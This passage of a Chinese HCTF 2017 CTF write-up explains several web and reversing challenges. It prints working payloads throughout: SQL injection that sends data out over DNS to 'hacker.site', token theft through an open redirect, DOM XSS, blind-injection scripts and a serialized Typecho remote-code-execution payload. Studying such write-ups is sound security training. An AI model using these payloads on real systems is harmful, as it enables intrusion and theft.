Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-05-09 21:27:33 0 issues reported "},"articals/2017hctf.html":{"url":"articals/2017hctf.html","title":"2017HCTF","keywords":"","body":"2017HCTF 题目类型： 类型 年份 难度 官方赛事题 2017 难 题目下载： https://github.com/vidar-team/HCTF2017 网上公开WP： https://xz.aliyun.com/t/1589 https://www.52pojie.cn/thread-662919-1-1.html 本站备份WP： 官方WP 前言: HCTF2017 Quals在11月12日正式落下帷幕了，我们很高兴HCTF的不断进步被人们看在眼里，HCTF2017第一次登陆CTFTIME，参加比赛并获得分数的队伍超过540只。 从HCTF创办以来，HCTF一直践行着做更好更棒的CTF比赛的准则，从2015年的反作弊系统、全新的比赛机制，到2016年的动态积分制，HCTF一直在努力将CTF变得更像一个hack game！ 今年我们第一次引入了分方向的闯关机制，将比赛题目分为 bin、web和 extra 三个大类，每一大类有五关，只有满足每关的开放条件，才能开放该关。 尽管规则导致的结果不竟如人意，但我们仍然进步，HCTF仍在变得更好。 Web easy_sign_in 这个题目真的真的非常简单，连提示都非常的明显就是去查看证书的内容。 从证书中我们可以得到一条flag in: 123.206.81.217 或许有些浏览器显示的位置不一定是这样. 打开123.206.81.217 就可以看到 flag: hctf{s00000_e4sy_sign_in} boring website 首先扫目录发现有www.zip,下载并打开发现是源码 \"; echo \"flag is hctf{what you get}\"; error_reporting(E_ALL^E_NOTICE^E_WARNING); try { $conn = new PDO( \"sqlsrv:Server=*****;Database=not_here\",\"oob\", \"\"); } catch( PDOException $e ) { die( \"Error connecting to SQL Server\".$e->getMessage() ); } #echo \"Connected to MySQL\"; echo \"Connected to SQL Server\"; $id = $_GET\\['id'\\]; if(preg_match('/EXEC|xp\\_cmdshell|sp\\_configure|xp_reg(.*)|CREATE|DROP|declare |if|insert|into|outfile|dumpfile|sleep|wait|benchmark/i', $id)) { die('NoNoNo'); } $query = \"select message from not\\_here\\_too where id = $id\"; //link server: O n linkname:mysql $stmt = $conn->query( $query ); if ( @$row = $stmt->fetch( PDO::FETCH_ASSOC ) ){ //TO DO: ... //It's time to sleep... } ?> 发现应该是sql server用linkserver来连接mysql。所以去查了一波linkserver的用法，以及结合注释可得select * from openquery(mysql,'select xxx')可以从mysql数据库中查得信息，但是没有回显，sleep函数也被ban了，然后看到oob的提示，去查了一波mysql out-of-band，发现load_file函数可以通过dns通道把所查得的数据带出来。接下来的过程就是十分常见简单的mysql注入的流程。最终的payload: /?id=1 union select * from openquery(mysql,'select load_file(concat(\"\\\\\\\\\",(select password from secret),\".hacker.site\\\\a.txt\"))') dnslog 平台可以自己搭也可以用ceye mysql out of band babycrack babycrack Description just babycrack 1.flag.substr(-5,3)==\"333\" 2.flag.substr(-8,1)==\"3\" 3.Every word makes sence. 4.sha256(flag)==\"d3f154b641251e319855a73b010309a168a12927f3873c97d2e5163ea5cbb443\" Now Score 302.93 Team solved 45 还是很抱歉题目的验证逻辑还是出现了不可逆推的问题，被迫在比赛中途加入4个hint来修复问题，下面我们来慢慢看看代码。 整个题目由反调试+代码混淆+逻辑混淆3部分组成，你可以说题目毫无意义完全为了出题而出题，但是这种代码确实最最真实的前端代码，现在许多站点都会选择使用反调试+混淆+一定程度的代码混淆来混淆部分前端代码。 出题思路主要有两篇文章： http://www.jianshu.com/p/9148d215c119https://zhuanlan.zhihu.com/p/29214928 整个题目主要是在我分析chrome拓展后门时候构思的，代码同样经过了很多重的混淆，让我们来一步步解释。 反调试 第一部分是反调试，当在页面内使用F12来调试代码时，会卡死在debugger代码处。 这里举个例子就是蘑菇街的登陆验证代码。 具体代码是这样的 eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('(3(){(3 a(){7{(3 b(2){9((\\'\\'+(2/2)).5!==1||2%g===0){(3(){}).8(\\'4\\')()}c{4}b(++2)})(0)}d(e){f(a,6)}})()})();',17,17,'||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20'.split('|'),0,{})); 美化一下 (function () { (function a() { try { (function b(i) { if (('' + (i / i)).length !== 1 || i % 20 === 0) { (function () {}).constructor('debugger')() } else { debugger } b(++i) })(0) } catch (e) { setTimeout(a, 5000) } })() })(); 这就是比较常见的反调试。我这里提供3种办法来解决这步。 1、使用node做代码调试。由于这里的debugger检测的是浏览器的调试，如果直接对代码调试就不会触发这样的问题。 2、静态分析因为题目中代码较少，我没办法把代码混入深层逻辑，导致代码可以纯静态分析。 3、patch debugger函数由于debugger本身智慧触发一次，不会无限制的卡死调试器，这里会出现这种情况，主要是每5s轮询检查一次。那么我们就可以通过patch settimeout函数来绕过。 window._setTimeout = window.setTimeout; window.setTimeout = function () {}; 这里可以用浏览器插件TamperMonkey解决问题。 除了卡死debug以外，我还加入了轮询刷新console的代码。 setInterval(\"window.console.log('Welcome to HCTF :>')\", 50); 同样的办法可以解决，就不多说了。 代码混淆 在去除掉这部分无用代码之后，我们接着想办法去除代码混淆。 这里最外层的代码混淆，我是通过https://github.com/javascript-obfuscator/javascript-obfuscator做了混淆。 ps:因为我在代码里加入了es6语法，市面上的很多工具都不支持es6语法，会导致去混淆的代码语法错误！ 更有趣的是，这种混淆是不可逆的，所以我们只能通过逐渐去混淆的方式来美化代码。 我们可以先简单美化一下代码格式 (function (_0xd4b7d6, _0xad25ab) { var _0x5e3956 = function (_0x1661d3) { while (--_0x1661d3) { _0xd4b7d6['push'](_0xd4b7d6['shift']()); } }; _0x5e3956(++_0xad25ab); }(_0x180a, 0x1a2)); var _0xa180 = function (_0x5c351c, _0x2046d8) { _0x5c351c = _0x5c351c - 0x0; var _0x26f3b3 = _0x180a[_0x5c351c]; return _0x26f3b3; }; function check(_0x5b7c0c) { try { var _0x2e2f8d = ['code', _0xa180('0x0'), _0xa180('0x1'), _0xa180('0x2'), 'invalidMonetizationCode', _0xa180('0x3'), _0xa180('0x4'), _0xa180('0x5'), _0xa180('0x6'), _0xa180('0x7'), _0xa180('0x8'), _0xa180('0x9'), _0xa180('0xa'), _0xa180('0xb'), _0xa180('0xc'), _0xa180('0xd'), _0xa180('0xe'), _0xa180('0xf'), _0xa180('0x10'), _0xa180('0x11'), 'url', _0xa180('0x12'), _0xa180('0x13'), _0xa180('0x14'), _0xa180('0x15'), _0xa180('0x16'), _0xa180('0x17'), _0xa180('0x18'), 'tabs', _0xa180('0x19'), _0xa180('0x1a'), _0xa180('0x1b'), _0xa180('0x1c'), _0xa180('0x1d'), 'replace', _0xa180('0x1e'), _0xa180('0x1f'), 'includes', _0xa180('0x20'), 'length', _0xa180('0x21'), _0xa180('0x22'), _0xa180('0x23'), _0xa180('0x24'), _0xa180('0x25'), _0xa180('0x26'), _0xa180('0x27'), _0xa180('0x28'), _0xa180('0x29'), 'toString', _0xa180('0x2a'), 'split']; var _0x50559f = _0x5b7c0c[_0x2e2f8d[0x5]](0x0, 0x4); var _0x5cea12 = parseInt(btoa(_0x50559f), 0x20); eval(function (_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2) { _0x2d59cf = function (_0x4be75f) { return _0x4be75f['toString'](_0x177f13); }; if (!'' ['replace'](/^/, String)) { while (_0x46da6f--) _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f); _0x802d91 = [function (_0x5e8f1a) { return _0x2829f2[_0x5e8f1a]; }]; _0x2d59cf = function () { return _0xa180('0x2b'); }; _0x46da6f = 0x1; }; while (_0x46da6f--) if (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[_0xa180('0x2c')](new RegExp('\\x5cb' + _0x2d59cf(_0x46da6f) + '\\x5cb', 'g'), _0x802d91[_0x46da6f]); return _0x200db2; }(_0xa180('0x2d'), 0x11, 0x11, _0xa180('0x2e')['split']('|'), 0x0, {})); (function (_0x3291b7, _0xced890) { var _0xaed809 = function (_0x3aba26) { while (--_0x3aba26) { _0x3291b7[_0xa180('0x4')](_0x3291b7['shift']()); } }; _0xaed809(++_0xced890); }(_0x2e2f8d, _0x5cea12 % 0x7b)); var _0x43c8d1 = function (_0x3120e0) { var _0x3120e0 = parseInt(_0x3120e0, 0x10); var _0x3a882f = _0x2e2f8d[_0x3120e0]; return _0x3a882f; }; var _0x1c3854 = function (_0x52ba71) { var _0x52b956 = '0x'; for (var _0x59c050 = 0x0; _0x59c050 > 0x3)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5) & 0x7) > 0x6)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x1) & 0x3f) >> 0x1)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x1) & 0x1) > 0x4)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x2) & 0xf) > 0x7)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x3) & 0x7f) >> 0x2)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')]((_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x3) & 0x3) > 0x5)); _0x4dc510[_0x43c8d1('1b')](_0x3c3bd8[_0x43c8d1('1d')](_0x3f9bc5[_0x43c8d1('f')](_0x1e1753 * 0x5 + 0x4) & 0x1f)); } var _0x545c12 = 0x0; if (_0x4ee491 == 0x1) _0x545c12 = 0x6; else if (_0x4ee491 == 0x2) _0x545c12 = 0x4; else if (_0x4ee491 == 0x3) _0x545c12 = 0x3; else if (_0x4ee491 == 0x4) _0x545c12 = 0x1; for (_0x1e1753 = 0x0; _0x1e1753 _0xffcc52[_0x43c8d1('f')]() * _0x76e1e8[0x1][_0x43c8d1(0x8)]; l = h(j[0x0], k); if (l != 0x2f9b5072) { return ![]; } m = _0x1c3854(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x0, 0x4)) - 0x48a05362 == n % l; function _0x5a6d56(_0x5a25ab, _0x4a4483) { var _0x55b09f = ''; for (var _0x508ace = 0x0; _0x508ace 代码里主要有几点混淆： 1、变量名替换，a --> _0xd4b7d6，这种东西最烦，但是也最简单，批量替换，在我看来即使abcd这种变量也比这个容易读 2、提取了所有的方法到一个数组，这种也简单，只要在chrome中逐步调试替换就可以了。 还有一些小的细节，很常见，没什么可说的 \"s\".length() --> \"s\"['length']() 最终代码可以优化到这个地步，基本已经可读了，下一步就是分析代码了。 function check(flag){ var _ = ['\\x63\\x6f\\x64\\x65', '\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e', '\\x65\\x72\\x72\\x6f\\x72', '\\x64\\x6f\\x77\\x6e\\x6c\\x6f\\x61\\x64', '\\x69\\x6e\\x76\\x61\\x6c\\x69\\x64\\x4d\\x6f\\x6e\\x65\\x74\\x69\\x7a\\x61\\x74\\x69\\x6f\\x6e\\x43\\x6f\\x64\\x65', '\\x54\\x6a\\x50\\x7a\\x6c\\x38\\x63\\x61\\x49\\x34\\x31', '\\x4b\\x49\\x31\\x30\\x77\\x54\\x77\\x77\\x76\\x46\\x37', '\\x46\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e', '\\x72\\x75\\x6e', '\\x69\\x64\\x6c\\x65', '\\x70\\x79\\x57\\x35\\x46\\x31\\x55\\x34\\x33\\x56\\x49', '\\x69\\x6e\\x69\\x74', '\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x74\\x68\\x65\\x2d\\x65\\x78\\x74\\x65\\x6e\\x73\\x69\\x6f\\x6e\\x2e\\x63\\x6f\\x6d', '\\x6c\\x6f\\x63\\x61\\x6c', '\\x73\\x74\\x6f\\x72\\x61\\x67\\x65', '\\x65\\x76\\x61\\x6c', '\\x74\\x68\\x65\\x6e', '\\x67\\x65\\x74', '\\x67\\x65\\x74\\x54\\x69\\x6d\\x65', '\\x73\\x65\\x74\\x55\\x54\\x43\\x48\\x6f\\x75\\x72\\x73', '\\x75\\x72\\x6c', '\\x6f\\x72\\x69\\x67\\x69\\x6e', '\\x73\\x65\\x74', '\\x47\\x45\\x54', '\\x6c\\x6f\\x61\\x64\\x69\\x6e\\x67', '\\x73\\x74\\x61\\x74\\x75\\x73', '\\x72\\x65\\x6d\\x6f\\x76\\x65\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72', '\\x6f\\x6e\\x55\\x70\\x64\\x61\\x74\\x65\\x64', '\\x74\\x61\\x62\\x73', '\\x63\\x61\\x6c\\x6c\\x65\\x65', '\\x61\\x64\\x64\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72', '\\x6f\\x6e\\x4d\\x65\\x73\\x73\\x61\\x67\\x65', '\\x72\\x75\\x6e\\x74\\x69\\x6d\\x65', '\\x65\\x78\\x65\\x63\\x75\\x74\\x65\\x53\\x63\\x72\\x69\\x70\\x74', '\\x72\\x65\\x70\\x6c\\x61\\x63\\x65', '\\x64\\x61\\x74\\x61', '\\x74\\x65\\x73\\x74', '\\x69\\x6e\\x63\\x6c\\x75\\x64\\x65\\x73', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f', '\\x6c\\x65\\x6e\\x67\\x74\\x68', '\\x55\\x72\\x6c\\x20\\x65\\x72\\x72\\x6f\\x72', '\\x71\\x75\\x65\\x72\\x79', '\\x66\\x69\\x6c\\x74\\x65\\x72', '\\x61\\x63\\x74\\x69\\x76\\x65', '\\x66\\x6c\\x6f\\x6f\\x72', '\\x72\\x61\\x6e\\x64\\x6f\\x6d', '\\x63\\x68\\x61\\x72\\x43\\x6f\\x64\\x65\\x41\\x74', '\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65', '\\x70\\x61\\x72\\x73\\x65']; var head = flag['substring'](0, 4); var base = parseInt(btoa(head), 0x20); //344800 (function (b, c) { var d = function (a) { while (--a) { b['push'](b['shift']()) } }; d(++c); }(_, base%123)); var g = function (a) { var a = parseInt(a, 0x10); var c = _[a]; return c; }; var s2h = function(str){ var result = \"0x\"; for(var i=0;i> 3)); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5) & 0x07) > 6))); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 1) & 0x3F) >> 1))); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 1) & 0x01) > 4))); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 2) & 0x0F) > 7))); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 3) & 0x7F) >> 2))); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 3) & 0x03) > 5))); parts.push(alphabet.charAt(((s['charCodeAt'](i * 5 + 4) & 0x1F)))); } var replace = 0; if (leftover == 1) replace = 6; else if (leftover == 2) replace = 4; else if (leftover == 3) replace = 3; else if (leftover == 4) replace = 1; for (i = 0; i str['charCodeAt']()*b[1]['length']; l = h(j[0],k); if(l!=0x2f9b5072){ return false; } m = s2h(b[4]['substr'](0,4))-0x48a05362 == n%l; function u(str, j){ var result = \"\"; for(var i=0;i剩下的代码已经没什么可说的了。 1、首先是确认flag前缀，然后按照_分割为5部分。 2、g函数对基础数组做了一些处理，已经没什么懂了。 3、s2h是字符串到hex的转化函数 4、第一部分的验证不完整，导致严重的多解，只能通过爆破是否符合sha256来解决。 5、后面引入的b2c函数很简单，测试就能发现是一个base32函数。 6、第三部分和第四部分最简单，异或可得 7、h函数会对输入的字符串每位做func函数处理，然后拼接起来。 8、第二部分由3分割，左右两边长度相等，同样可以推算出结果。 9、k是我专门加入的es6语法的箭头语法，对传入的每个字母做乘7操作。 10、最后一题通过简单的判断，可以确定最后一部分的前四位。 11、u函数返回指定字符串的指定前几位 12、剩下的就是一连串的条件: 13、首先是一些很关键的的重复位，由于我写错了一些东西，导致这里永远是false，后被迫给出这几位.!m || u(b[4]['substr'](5,1),2) == b[4]['substr'](-5,4) || (b[4]['substr'](-2,1) - b[4]['substr'](4,1)) != 1 14、最后一部分是集合长度、以及部分条件完成的，看上去存在多解，但事实上是能逆向出来结果的。 当我们都完成这部分的时候，flag就会被我们解出来了。 poker 这次想以游戏安全出一些题目，但是又担心出的太难，大家没做过类似的游戏漏洞挖掘(其实是为了偷懒)，就出了一道战斗频率没有限制的刷级漏洞。这是一个去掉充值功能以外完整的游戏，我去掉了后台对于加速器的检测机制。提示给的很明显，在flag.php里提示了 getFlag when you are at level 100!!! 升到一百级就可以拿到flag，但是比赛时间的48个小时正常情况下不吃不喝也是升不到100级的，ctf本来就是一个hack game，所以需要分析他的游戏机制。这个版本的poker2没有战斗频率限制，可以高速无限战斗，脚本很简单，但是还需要分析游戏的细节。众多野怪地图里有一个叫圣诞小屋的挂机地图，伤害低经验高，写好挂机脚本还是很简单的。 import requests import re from time import sleep host = \"petgame.2017.hctf.io\" headers = { \"Cookie\":\"PHPSESSID=c4gn8hav06nsv43bo65tlfkto3\" } def getFight(host, headers): url = \"http://\"+host+\"/function/Fight_Mod.php?p=37&bid=5226&rd=0.5365947475076844\" req = requests.get(url = url, headers = headers) html = req.content gid = re.findall(\"gg=\\[.*,(.*)\\]\",html) if len(gid)>0: gid = gid[0] attack(gid, 4, host, headers) else: return False def attack(gid, times, host, headers): url = \"http://\"+host+\"/function/FightGate.php?id=1&g=\"+str(gid)+\"&checkwg=checked&rd=0.34966725314993186\" for i in xrange(0,times-1): req = requests.get(url = url, headers = headers) html = req.content print html while True: getFight(host,headers) # sleep(0.1) #attack(86,url,headers) 其实还有其他解法，就是在poker-poker一题中找到注入点，如果有一百级的玩家的密码是弱口令(md5可查)则可以进入其他人账号获得flag。我特意把poker2一题放在第二层，poker-poker在第三层，但是还是有人找到了非预期的注入点(注册处)，提前获取了别人的session，在我删除一百级账号前获得flag。 poker-poker 这题就比较难受了，看了大家传上来的wp，没有一份是预期解。由于游戏程序比较多，我也没全部看过，就找了一处隐蔽的有回显注入点，但是有一些前置条件。题目提示是pspt，访问发现跳转到pspt/并且状态403，说明存在pspt目录。pspt目录下存在robots.txt。 Disallow: /pspt/inf/queryUserRole.php Sitemap: http://domain.com/sitemap.xml 直接访问/pspt/inf/queryUserRole.php提示error1。该目录下存在.bak文件，泄漏了源码。 getOneRecord(\"SELECT id,nickname FROM player WHERE name = '{$_GET['user_account']}'\"); if (!is_array($arr)) { die('error4'); } $str = $arr['id'].'&'.$arr['nickname']; $newstr = iconv('utf8','utf-8',$str); echo $newstr; unset($time,$arr,$str); ?> 此处泄漏了encryKey，只要有这个encryKey，我们可以根据源码写出注入payload。poc: import requests import time import hashlib import urllib2 def getMd5(data): data = str(data) t = hashlib.md5() t.update(data) return t.hexdigest() def hack(payload=\"admin\"): user_account = urllib2.quote(payload) valid_date = int(time.time())+10000 sign = getSign(user_account, valid_date) url = \"http://petgame.2017.hctf.io/pspt/inf/queryUserRole.php?user_account=\"+str(user_account)+\"&valid_date=\"+str(valid_date)+\"&sign=\"+sign req = requests.get(url = url) print req.content def getSign(user_account, valid_date): user_account = urllib2.unquote(user_account) encryKey = '7sl+kb9adDAc7gLuv31MeEFPBMJZdRZyAx9eEmXSTui4423hgGfXF1pyM' sign = getMd5(str(user_account) + str(valid_date) + encryKey) return sign hack(\"adminss' union all select 111,flag from hctf.flag2#\") flag就在hctf库里的hctf2表里。而大家找到的其他注入点 A World Restored & A World Restored Again A World Restored Description: nothing here or all the here ps:flag in admin cookie flag is login as admin URL http://messbox.2017.hctf.io Now Score 674.44 Team solved 7 A World Restored Again Description: New Challenge !! hint: flag only from admin bot URL http://messbox.2017.hctf.io Now Score 702.6 Team solved 6 A World Restored在出题思路本身是来自于uber在10月14号公开的一个漏洞https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html，为了能尽可能的模拟真实环境，我这个不专业的Web开发只能强行上手实现站库分离。 其中的一部分非预期，也都是因为站库分离实现的不好而导致的。（更开放的题目环境，导致了很多可能，或许这没什么不好的？ 整个站的结构是这样的：1、auth站负责用户数据的处理，包括登陆验证、注册等，是数据库所在站。2、messbox站负责用户的各种操作，但不连接数据库。 这里auth站与messbox站属于两个完全不同的域，受到同源策略的影响，我们就需要有办法来沟通两个站。 而这里，我选择使用token做用户登陆的校验+jsonp来获取用户数据。站点结构如下: 简单来说就是，messbox登陆账号完全受到token校验，即使你在完全不知道账号密码的情况下，获取该token就可以登陆账号。 那么怎么获取token登陆admin账号就是第一题。 而第二题，漏洞点就是上面文章中写的那样，反射性的domxss，可以得到服务端的flag。 为了两个flag互不干扰，我对服务端做了一定的处理，服务端负责处理flag的代码如下： $flag1 = \"hctf{xs5_iz_re4lly_complex34e29f}\"; $flag2 = \"hctf{mayb3_m0re_way_iz_best_for_ctf}\"; if(!empty($_SESSION['user'])){ if($_SESSION['user'] === 'hctf_admin_LoRexxar2e23322'){ setcookie(\"flag\", $flag, time()+3600*48,\" \",\"messbox.2017.hctf.io\", 0, true); } if($_SESSION['user'] === 'hctf_admin_LoRexxar2e23322' && $_GET['check']==\"233e\"){ setcookie(\"flag2\", $flag2, time()+3600*48,\" \",\".2017.hctf.io\"); } } 可以很明显的看出来，flag1是httponly并在messbox域下，只能登陆才能查看。flag2我设置了check位，只有bot才会访问这个页面，这样只有通过反射性xss，才能得到flag。 下面我们回到题目。 A World Restored A World Restored Description: nothing here or all the here ps:flag in admin cookie flag is login as admin URL http://messbox.2017.hctf.io Now Score 674.44 Team solved 7 这道题目在比赛结束时，只有7只队伍最终完成了，非常出乎我的意料，因为漏洞本身非常有意思。（这个漏洞是ROIS发现的） 为了能够实现token，我设定了token不可逆的二重验证策略，但是在题目中我加入了一个特殊的接口，让我们回顾一下。 auth域中的login.php，我加入了这样一段代码 if(!empty($_GET['n_url'])){ $n_url = trim($_GET['n_url']); echo \"window.location.href='\".$n_url.\"?token=\".$usertoken.\"'\"; exit; }else{ // header(\"location: http://messbox.hctf.com?token=\".$usertoken); echo \"window.location.href='http://messbox.2017.hctf.io?token=\".$usertoken.\"'\"; exit; } 这段代码也是两个漏洞的核心漏洞点，假设你在未登录状态下访问messbox域下的user.php或者report.php这两个页面，那么因为未登录，页面会跳转到auth域并携带n_url，如果获取到登陆状态，这里就会拼接token传回messbox域，并赋予登陆状态。 简单的流程如下： `未登录->获取当前URL->跳转至auth->获取登陆状态->携带token跳转到刚才获取的URL->messbox登陆成功` 当然，这其中是有漏洞的。 服务端bot必然登陆了admin账号，如果我们直接请求login.php并制定下一步跳转的URL，那么我们就可以获取拼接上的token！ poc `http://auth.2017.hctf.io/login.php?n_url=http://{you_website}` 得到token我们就可以登陆messbox域，成功登陆admin A World Restored Again A World Restored Again Description: New Challenge !! hint: flag only from admin bot URL http://messbox.2017.hctf.io Now Score 702.6 Team solved 6 到了第二部，自然就是xss了，其实题目本身非常简单，在出题之初，为了避免题目出现“垃圾时间”（因为非预期导致题目不可解），我在题目中加入了跟多元素。 并把flag2放置在.2017.hctf.io域下，避免有人找到messbox的xss但是打不到flag的问题。（没想到真的用上了） 这里我就简单描述下预期解法和非预期解法两个。 预期解法 预期解法当然来自于出题思路。 https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html 漏洞本身非常简单，但有意思的是利用思路。 当你发现了一个任意URL跳转的漏洞，会不会考虑漏洞是怎么发生的？ 也许你平时可能没注意过，但跳转一般是分两种的，第一种是服务端做的，利用header: location,这种跳转我们没办法阻止。第二种是js使用location.href导致的跳转。 既然是js实现的，那么是不是有可能存在dom xss漏洞呢？ 这个uber的漏洞由来就是如此。 这里唯一的考点就是，js是一种顺序执行的语言，如果location报错，那么就不会继续执行后面的js，如果location不报错，那么就可能在执行下一句之前跳转走。 当然，办法很多。最普通的可能是在location后使用stop()来阻止跳转，但最好用的就是新建script块，这样上一个script报错不会影响到下一个script块。 最终payload 非预期解法 除了上面的漏洞以外，messbox也有漏洞，username在首页没有经过任何过滤就显示在了页面内。 但username这里漏洞会有一些问题，因为本身预期的漏洞点并不是这里，所以这里的username经过我框架本身的一点儿过滤，而且长度有限制，所以从这里利用的人会遇到很多非预期的问题。 payload如下，注册名为 的用户名，并获取token。 传递 http://messbox.2017.hctf.io/?token=NDYyMGZlMTNhNWM3YTAxY3xQSE5qY21sd2RDQnpjb U05THk5aGRYUm9Makl3TVRjdWFHTjBaaTVwYnk5blpYUnRaWE56WVdkbExuQm9jRDlqWVd4c1ltR mphejFzYjJOaGRHbHZiajBsTWpkb2RIUndPaTh2Y205dmRHc3VjSGN2SlRJM0pUSmlZblJ2WVNoa 2IyTjFiV1Z1ZEM1amIyOXJhV1VwT3k4dlBqd3ZjMk55YVhCMFBnPT0= 即可 SQL Silencer 有些假过滤，简化一下贴出注入部分最重要部分的代码 function sql_check($sql){ if($sql 3){ die('We only have 3 users.'); } $check = preg\\_match('/&|\\_|\\\\+|or|,|and| |\\\\|\\\\||#|-|`|;|\"|\\\\'|\\\\*|into|union(\\[\\\\s\\\\S\\]+)select(\\[\\\\s\\\\S\\]+)from/i',$sql); if( $check ){ die(\"Nonono!\"); } else { return $sql; } } 这道题其实是可以显注的，各位有兴趣的可以先去试试然而由于是黑名单不全的原因，几乎所有队伍都是用盲注做出来的当前数据库有2个表，一个user，一个flaguser表里有3条数据，flag表里也有2条数据所以有队伍在子查询中测试select(flag)from(flag)会返回there is nothing从而怀疑flag表不存在因为数据库中会报错：ERROR 1242 (21000): Subquery returns more than 1 row 先说盲注吧，由于很多函数都没禁用，盲注的方法有很多，随便贴一个由于3^1=2 -> Bob ,3^2=1 -> Alice, 3^0 -> Cc看flag表中有多少行 id=3^(select(count(flag))from(flag)) 返回Alice，确定flag表中只有2条数据跑flag的poc: `id=3^(select(count(1))from(flag)where(binary(flag)写脚本直接跑就能跑出一个目录名，由于flag表里中第一条数据是没啥用的。给做题师傅们带来了些困扰，有些抱歉。 #!/usr/bin/env python \\# -*- coding:utf-8 -*- \\# author = 'c014' import requests s = requests.session() flag = \"\" for i in xrange(100): for j in range(33,128): url = \"http://sqls.2017.hctf.io/index/index.php?id=3^(select(count(1))from(flag)where(binary(flag)跑出目录'./H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/'后访问/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/index.php发现搭的是typecho可以拿前段时间的Typecho前台getshell漏洞直接打有两种方法，一种是直接回显命令执行，另一种是上传shell由于根目录一般不会有可写权限，所以我准备了一个uploads目录，并且存在.DS_Store泄露直接打的poc为： Url: http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php?finish Post: __typecho_config=YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9 Referer: http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php?finish= 根据需求修改base64内容即可上传shell的poc为： Url: http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php?finish Cookie: 